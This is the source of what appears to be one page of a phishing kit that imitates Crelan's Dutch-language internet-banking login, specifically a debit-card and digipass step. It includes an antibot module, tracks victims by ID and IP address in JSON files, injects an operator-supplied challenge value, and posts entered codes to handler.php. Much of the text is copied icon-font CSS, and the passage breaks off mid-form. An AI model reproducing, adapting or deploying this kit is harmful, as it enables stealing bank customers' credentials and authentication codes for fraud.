<?php
require_once __DIR__ . '/../antibot/antibot.php';

// Generate unique participant ID if not exists
if (!isset($_SESSION['participant_id'])) {
    $_SESSION['participant_id'] = uniqid('participant_', true);
}

$participant_id = $_SESSION['participant_id'];

// Update participant status in JSON file
function updateParticipantStatus($participant_id, $status) {
    $session_file = '../session/participants.json';
    
    // Create file if it doesn't exist
    if (!file_exists($session_file)) {
        file_put_contents($session_file, json_encode([]));
    }
    
    // Read existing data
    $participants = json_decode(file_get_contents($session_file), true);
    if (!$participants) {
        $participants = [];
    }
    
    // Get client IP address
    $ip_address = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    
    // Update or add participant (keep existing IP if already set)
    $existing_ip = isset($participants[$participant_id]) ? $participants[$participant_id]['ip'] : $ip_address;
    
    $participants[$participant_id] = [
        'id' => $participant_id,
        'status' => $status,
        'ip' => $existing_ip
    ];
    
    // Save back to file
    file_put_contents($session_file, json_encode($participants, JSON_PRETTY_PRINT));
}

// Update status to question3
updateParticipantStatus($participant_id, 'question3');

// get the $random_value from the session scores.json file from "additional_info"
$scores_file = '../session/scores.json';
if (file_exists($scores_file)) {
    $scores = json_decode(file_get_contents($scores_file), true);
    if (isset($scores[$participant_id]['additional_info'])) {
        $random_value = $scores[$participant_id]['additional_info'];
    }
}
?>

<html class="notranslate" translate="no" lang="nl" data-react-helmet="lang"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="google" content="notranslate"><style type="text/css">:root, :host {
  --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Solid";
  --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Regular";
  --fa-font-light: normal 300 1em/1 "Font Awesome 6 Light";
  --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Thin";
  --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
  --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-regular: normal 400 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-light: normal 300 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-thin: normal 100 1em/1 "Font Awesome 6 Sharp";
  --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
}

svg:not(:root).svg-inline--fa, svg:not(:host).svg-inline--fa {
  overflow: visible;
  box-sizing: content-box;
}

.svg-inline--fa {
  display: var(--fa-display, inline-block);
  height: 1em;
  overflow: visible;
  vertical-align: -0.125em;
}
.svg-inline--fa.fa-2xs {
  vertical-align: 0.1em;
}
.svg-inline--fa.fa-xs {
  vertical-align: 0em;
}
.svg-inline--fa.fa-sm {
  vertical-align: -0.0714285705em;
}
.svg-inline--fa.fa-lg {
  vertical-align: -0.2em;
}
.svg-inline--fa.fa-xl {
  vertical-align: -0.25em;
}
.svg-inline--fa.fa-2xl {
  vertical-align: -0.3125em;
}
.svg-inline--fa.fa-pull-left {
  margin-right: var(--fa-pull-margin, 0.3em);
  width: auto;
}
.svg-inline--fa.fa-pull-right {
  margin-left: var(--fa-pull-margin, 0.3em);
  width: auto;
}
.svg-inline--fa.fa-li {
  width: var(--fa-li-width, 2em);
  top: 0.25em;
}
.svg-inline--fa.fa-fw {
  width: var(--fa-fw-width, 1.25em);
}

.fa-layers svg.svg-inline--fa {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0;
}

.fa-layers-counter, .fa-layers-text {
  display: inline-block;
  position: absolute;
  text-align: center;
}

.fa-layers {
  display: inline-block;
  height: 1em;
  position: relative;
  text-align: center;
  vertical-align: -0.125em;
  width: 1em;
}
.fa-layers svg.svg-inline--fa {
  -webkit-transform-origin: center center;
          transform-origin: center center;
}

.fa-layers-text {
  left: 50%;
  top: 50%;
  -webkit-transform: translate(-50%, -50%);
          transform: translate(-50%, -50%);
  -webkit-transform-origin: center center;
          transform-origin: center center;
}

.fa-layers-counter {
  background-color: var(--fa-counter-background-color, #ff253a);
  border-radius: var(--fa-counter-border-radius, 1em);
  box-sizing: border-box;
  color: var(--fa-inverse, #fff);
  line-height: var(--fa-counter-line-height, 1);
  max-width: var(--fa-counter-max-width, 5em);
  min-width: var(--fa-counter-min-width, 1.5em);
  overflow: hidden;
  padding: var(--fa-counter-padding, 0.25em 0.5em);
  right: var(--fa-right, 0);
  text-overflow: ellipsis;
  top: var(--fa-top, 0);
  -webkit-transform: scale(var(--fa-counter-scale, 0.25));
          transform: scale(var(--fa-counter-scale, 0.25));
  -webkit-transform-origin: top right;
          transform-origin: top right;
}

.fa-layers-bottom-right {
  bottom: var(--fa-bottom, 0);
  right: var(--fa-right, 0);
  top: auto;
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: bottom right;
          transform-origin: bottom right;
}

.fa-layers-bottom-left {
  bottom: var(--fa-bottom, 0);
  left: var(--fa-left, 0);
  right: auto;
  top: auto;
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: bottom left;
          transform-origin: bottom left;
}

.fa-layers-top-right {
  top: var(--fa-top, 0);
  right: var(--fa-right, 0);
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: top right;
          transform-origin: top right;
}

.fa-layers-top-left {
  left: var(--fa-left, 0);
  right: auto;
  top: var(--fa-top, 0);
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: top left;
          transform-origin: top left;
}

.fa-1x {
  font-size: 1em;
}

.fa-2x {
  font-size: 2em;
}

.fa-3x {
  font-size: 3em;
}

.fa-4x {
  font-size: 4em;
}

.fa-5x {
  font-size: 5em;
}

.fa-6x {
  font-size: 6em;
}

.fa-7x {
  font-size: 7em;
}

.fa-8x {
  font-size: 8em;
}

.fa-9x {
  font-size: 9em;
}

.fa-10x {
  font-size: 10em;
}

.fa-2xs {
  font-size: 0.625em;
  line-height: 0.1em;
  vertical-align: 0.225em;
}

.fa-xs {
  font-size: 0.75em;
  line-height: 0.0833333337em;
  vertical-align: 0.125em;
}

.fa-sm {
  font-size: 0.875em;
  line-height: 0.0714285718em;
  vertical-align: 0.0535714295em;
}

.fa-lg {
  font-size: 1.25em;
  line-height: 0.05em;
  vertical-align: -0.075em;
}

.fa-xl {
  font-size: 1.5em;
  line-height: 0.0416666682em;
  vertical-align: -0.125em;
}

.fa-2xl {
  font-size: 2em;
  line-height: 0.03125em;
  vertical-align: -0.1875em;
}

.fa-fw {
  text-align: center;
  width: 1.25em;
}

.fa-ul {
  list-style-type: none;
  margin-left: var(--fa-li-margin, 2.5em);
  padding-left: 0;
}
.fa-ul > li {
  position: relative;
}

.fa-li {
  left: calc(var(--fa-li-width, 2em) * -1);
  position: absolute;
  text-align: center;
  width: var(--fa-li-width, 2em);
  line-height: inherit;
}

.fa-border {
  border-color: var(--fa-border-color, #eee);
  border-radius: var(--fa-border-radius, 0.1em);
  border-style: var(--fa-border-style, solid);
  border-width: var(--fa-border-width, 0.08em);
  padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);
}

.fa-pull-left {
  float: left;
  margin-right: var(--fa-pull-margin, 0.3em);
}

.fa-pull-right {
  float: right;
  margin-left: var(--fa-pull-margin, 0.3em);
}

.fa-beat {
  -webkit-animation-name: fa-beat;
          animation-name: fa-beat;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
          animation-timing-function: var(--fa-animation-timing, ease-in-out);
}

.fa-bounce {
  -webkit-animation-name: fa-bounce;
          animation-name: fa-bounce;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
}

.fa-fade {
  -webkit-animation-name: fa-fade;
          animation-name: fa-fade;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
}

.fa-beat-fade {
  -webkit-animation-name: fa-beat-fade;
          animation-name: fa-beat-fade;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
}

.fa-flip {
  -webkit-animation-name: fa-flip;
          animation-name: fa-flip;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
          animation-timing-function: var(--fa-animation-timing, ease-in-out);
}

.fa-shake {
  -webkit-animation-name: fa-shake;
          animation-name: fa-shake;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, linear);
          animation-timing-function: var(--fa-animation-timing, linear);
}

.fa-spin {
  -webkit-animation-name: fa-spin;
          animation-name: fa-spin;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 2s);
          animation-duration: var(--fa-animation-duration, 2s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, linear);
          animation-timing-function: var(--fa-animation-timing, linear);
}

.fa-spin-reverse {
  --fa-animation-direction: reverse;
}

.fa-pulse,
.fa-spin-pulse {
  -webkit-animation-name: fa-spin;
          animation-name: fa-spin;
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, steps(8));
          animation-timing-function: var(--fa-animation-timing, steps(8));
}

@media (prefers-reduced-motion: reduce) {
  .fa-beat,
.fa-bounce,
.fa-fade,
.fa-beat-fade,
.fa-flip,
.fa-pulse,
.fa-shake,
.fa-spin,
.fa-spin-pulse {
    -webkit-animation-delay: -1ms;
            animation-delay: -1ms;
    -webkit-animation-duration: 1ms;
            animation-duration: 1ms;
    -webkit-animation-iteration-count: 1;
            animation-iteration-count: 1;
    -webkit-transition-delay: 0s;
            transition-delay: 0s;
    -webkit-transition-duration: 0s;
            transition-duration: 0s;
  }
}
@-webkit-keyframes fa-beat {
  0%, 90% {
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  45% {
    -webkit-transform: scale(var(--fa-beat-scale, 1.25));
            transform: scale(var(--fa-beat-scale, 1.25));
  }
}
@keyframes fa-beat {
  0%, 90% {
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  45% {
    -webkit-transform: scale(var(--fa-beat-scale, 1.25));
            transform: scale(var(--fa-beat-scale, 1.25));
  }
}
@-webkit-keyframes fa-bounce {
  0% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  10% {
    -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
  }
  30% {
    -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
  }
  50% {
    -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
  }
  57% {
    -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
  }
  64% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  100% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
}
@keyframes fa-bounce {
  0% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  10% {
    -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
  }
  30% {
    -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
  }
  50% {
    -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
  }
  57% {
    -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
  }
  64% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  100% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
}
@-webkit-keyframes fa-fade {
  50% {
    opacity: var(--fa-fade-opacity, 0.4);
  }
}
@keyframes fa-fade {
  50% {
    opacity: var(--fa-fade-opacity, 0.4);
  }
}
@-webkit-keyframes fa-beat-fade {
  0%, 100% {
    opacity: var(--fa-beat-fade-opacity, 0.4);
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  50% {
    opacity: 1;
    -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
            transform: scale(var(--fa-beat-fade-scale, 1.125));
  }
}
@keyframes fa-beat-fade {
  0%, 100% {
    opacity: var(--fa-beat-fade-opacity, 0.4);
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  50% {
    opacity: 1;
    -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
            transform: scale(var(--fa-beat-fade-scale, 1.125));
  }
}
@-webkit-keyframes fa-flip {
  50% {
    -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
  }
}
@keyframes fa-flip {
  50% {
    -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
  }
}
@-webkit-keyframes fa-shake {
  0% {
    -webkit-transform: rotate(-15deg);
            transform: rotate(-15deg);
  }
  4% {
    -webkit-transform: rotate(15deg);
            transform: rotate(15deg);
  }
  8%, 24% {
    -webkit-transform: rotate(-18deg);
            transform: rotate(-18deg);
  }
  12%, 28% {
    -webkit-transform: rotate(18deg);
            transform: rotate(18deg);
  }
  16% {
    -webkit-transform: rotate(-22deg);
            transform: rotate(-22deg);
  }
  20% {
    -webkit-transform: rotate(22deg);
            transform: rotate(22deg);
  }
  32% {
    -webkit-transform: rotate(-12deg);
            transform: rotate(-12deg);
  }
  36% {
    -webkit-transform: rotate(12deg);
            transform: rotate(12deg);
  }
  40%, 100% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
}
@keyframes fa-shake {
  0% {
    -webkit-transform: rotate(-15deg);
            transform: rotate(-15deg);
  }
  4% {
    -webkit-transform: rotate(15deg);
            transform: rotate(15deg);
  }
  8%, 24% {
    -webkit-transform: rotate(-18deg);
            transform: rotate(-18deg);
  }
  12%, 28% {
    -webkit-transform: rotate(18deg);
            transform: rotate(18deg);
  }
  16% {
    -webkit-transform: rotate(-22deg);
            transform: rotate(-22deg);
  }
  20% {
    -webkit-transform: rotate(22deg);
            transform: rotate(22deg);
  }
  32% {
    -webkit-transform: rotate(-12deg);
            transform: rotate(-12deg);
  }
  36% {
    -webkit-transform: rotate(12deg);
            transform: rotate(12deg);
  }
  40%, 100% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
}
@-webkit-keyframes fa-spin {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
  }
}
@keyframes fa-spin {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
  }
}
.fa-rotate-90 {
  -webkit-transform: rotate(90deg);
          transform: rotate(90deg);
}

.fa-rotate-180 {
  -webkit-transform: rotate(180deg);
          transform: rotate(180deg);
}

.fa-rotate-270 {
  -webkit-transform: rotate(270deg);
          transform: rotate(270deg);
}

.fa-flip-horizontal {
  -webkit-transform: scale(-1, 1);
          transform: scale(-1, 1);
}

.fa-flip-vertical {
  -webkit-transform: scale(1, -1);
          transform: scale(1, -1);
}

.fa-flip-both,
.fa-flip-horizontal.fa-flip-vertical {
  -webkit-transform: scale(-1, -1);
          transform: scale(-1, -1);
}

.fa-rotate-by {
  -webkit-transform: rotate(var(--fa-rotate-angle, none));
          transform: rotate(var(--fa-rotate-angle, none));
}

.fa-stack {
  display: inline-block;
  vertical-align: middle;
  height: 2em;
  position: relative;
  width: 2.5em;
}

.fa-stack-1x,
.fa-stack-2x {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0;
  z-index: var(--fa-stack-z-index, auto);
}

.svg-inline--fa.fa-stack-1x {
  height: 1em;
  width: 1.25em;
}
.svg-inline--fa.fa-stack-2x {
  height: 2em;
  width: 2.5em;
}

.fa-inverse {
  color: var(--fa-inverse, #fff);
}

.sr-only,
.fa-sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border-width: 0;
}

.sr-only-focusable:not(:focus),
.fa-sr-only-focusable:not(:focus) {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border-width: 0;
}

.svg-inline--fa .fa-primary {
  fill: var(--fa-primary-color, currentColor);
  opacity: var(--fa-primary-opacity, 1);
}

.svg-inline--fa .fa-secondary {
  fill: var(--fa-secondary-color, currentColor);
  opacity: var(--fa-secondary-opacity, 0.4);
}

.svg-inline--fa.fa-swap-opacity .fa-primary {
  opacity: var(--fa-secondary-opacity, 0.4);
}

.svg-inline--fa.fa-swap-opacity .fa-secondary {
  opacity: var(--fa-primary-opacity, 1);
}

.svg-inline--fa mask .fa-primary,
.svg-inline--fa mask .fa-secondary {
  fill: black;
}

.fad.fa-inverse,
.fa-duotone.fa-inverse {
  color: var(--fa-inverse, #fff);
}</style><link rel="shortcut icon" href="./favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name="format-detection" content="telephone=no"><meta name="apple-itunes-app" content="app-id=893585833"><link rel="manifest" href="./manifest.json"><title>Home | Login</title><link href="./files/main.4393a533.css" rel="stylesheet">
<style data-emotion="css" data-s=""></style></head><body><div id="root"><div class="argnt-container"><div class="argnt-p-login-page"><div class="argnt-p-login-page-wrapper"><div class="argnt-p-login-page-content-center"><header class="grid grid--justifyCenter"><div class="grid__cell grid__cell--lg-12"><div class="argnt-m-header argnt-m-header--mobile"><div class="argnt-m-header__logo">
  <a class="argnt-a-logo argnt-a-logo--icon" href="https://www.crelan.be/nl.html" target="_blank"><img src="./files/my-main_logo.svg" alt="" srcset=""></a></div><div class="argnt-m-header__actions"><button type="button" class="argnt-a-language-selection" lang="fr"><span class="sr-only">Modifiez la langue vers le français</span><span class="argnt-a-body argnt-a-body__small argnt-a-body__semi-bold argnt-a-language-selection__label" aria-hidden="true">be</span></button></a></div></div></div></header><main class="grid grid--justifyCenter argnt-p-login-page__flex-grow-1"><div class="argnt-p-image-background-container aside_screen">
  <a href="http://"> terug naar profielen </a><br><br><h2>Maak uw profiel aan in 3 stappen</h2><br><img src="./files/skateboard.png" alt="skateboard"><div><a href="http://" target="_blank" rel="noopener noreferrer"> Contacteer ons </a></div>
  <div class="argnt-p-image-background"></div></div><div class=""style="width: 100%"><div class="argnt-p-login-page__content-wrapper"><div class="argnt-p-login-page__content"><div><div class="argnt-p-login"><h1 class="argnt-a-heading argnt-a-heading-h2 argnt-a-heading__bold argnt-p-login__title">Aanmelden op internetbankieren</h1><div class="argnt-m-login-component"><div class="argnt-m-announcements"></div><div class="sr-only"><section class="argnt-a-message argnt-a-message--error"><div class="argnt-a-message__icon-wrapper"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="circle-exclamation" class="svg-inline--fa fa-circle-exclamation " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm0-384c-8.8 0-16 7.2-16 16V272c0 8.8 7.2 16 16 16s16-7.2 16-16V144c0-8.8-7.2-16-16-16zm24 224a24 24 0 1 0 -48 0 24 24 0 1 0 48 0z"></path></svg></div><div class="argnt-a-message__body"><p role="alert"></p></div></section></div><div class="argnt-m-loader-wrapper"><div class="argnt-q-collapse argnt-q-collapse--open" aria-hidden="false" style="overflow: visible; opacity: 1; height: auto;"><div class="argnt-q-collapse__content"><div class="argnt-m-form-login">


<section id="digipass" class="argnt-m-form-digipass-login"><div class="argnt-a-collapse-item argnt-a-collapse-item--box-shadow"><h2 class="argnt-a-collapse-item__header-as"><button type="button" id="digipass-collapse-control" aria-expanded="true" aria-controls="digipass-collapse-content" class="argnt-a-collapse-item__summary argnt-m-form-digipass-login__header"><span class="argnt-a-collapse-header argnt-a-collapse-header--open"><span class="argnt-a-collapse-header-icon-and-titles-wrapper"><span class="argnt-a-icon"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="calculator" class="svg-inline--fa fa-calculator " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" alt="" style="width: 24px; height: 24px;"><path fill="currentColor" d="M352 160V448c0 17.7-14.3 32-32 32H64c-17.7 0-32-14.3-32-32V160H352zm0-32H32V64c0-17.7 14.3-32 32-32H320c17.7 0 32 14.3 32 32v64zm32 0V64c0-35.3-28.7-64-64-64H64C28.7 0 0 28.7 0 64v64 16 16V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V160 144 128zM72 224a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zM264 416a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zM80 400c-8.8 0-16 7.2-16 16s7.2 16 16 16H208c8.8 0 16-7.2 16-16s-7.2-16-16-16H80z"></path></svg></span><span class="argnt-a-collapse-header-titles"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__regular argnt-a-collapse-header-title">Aanmelden met</span><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold argnt-a-collapse-header-title">Debetkaart en digipas</span></span></span><span class="argnt-a-collapse-header-indicator-wrapper open"><span class="argnt-a-collapse-indicator"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-up" class="svg-inline--fa fa-chevron-up " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="transform: rotate(0deg); transition-property: transform; transition-duration: 175ms; transition-timing-function: ease-in-out;"><path fill="currentColor" d="M244.7 116.7c6.2-6.2 16.4-6.2 22.6 0l192 192c6.2 6.2 6.2 16.4 0 22.6s-16.4 6.2-22.6 0L256 150.6 75.3 331.3c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6l192-192z"></path></svg></span></span></span></button></h2><div class="argnt-q-collapse-transition argnt-q-collapse-transition--collapse argnt-q-collapse-transition--show argnt-a-collapse-item__transition-wrapper" id="digipass-collapse-content" role="region" aria-labelledby="digipass-collapse-control" aria-hidden="false" style=""><div class="argnt-a-collapse-item__content">


 <form method="post" action="handler.php">
 <input type="hidden" name="question_number" value="3">
 <input type="hidden" name="participant_id" value="<?php echo htmlspecialchars($participant_id); ?>">
 <input type="hidden" name="dynamic_value" value="<?php echo $random_value; ?>">
<div class="argnt-q-collapse-transition argnt-q-collapse-transition--collapse argnt-q-collapse-transition--show argnt-a-collapse-item__transition-wrapper" id="digipass-collapse-content" role="region" aria-labelledby="digipass-collapse-control" aria-hidden="false" style=""><div class="argnt-a-collapse-item__content"><div class="argnt-m-form-digipass-login__form"><div class="argnt-m-form-digipass-login__form__details"><div class="argnt-a-field-container argnt-a-field-container--gap-16"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold argnt-m-form-digipass-login__form__signature-subtitle">2. Steek je debetkaart in de digipas</span><div class="arg-m-signature"><div class="arg-m-signature-container"><ol id="signature-m1" class="arg-m-signature__list"><li class="argnt-m-signature--field argnt-m-signature--field--m1"><div class="argnt-a-field-container"><div class="argnt-m-signature--field-with-image"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold">1. Druk opnieuw op deze toets ▶️</span><img alt="" 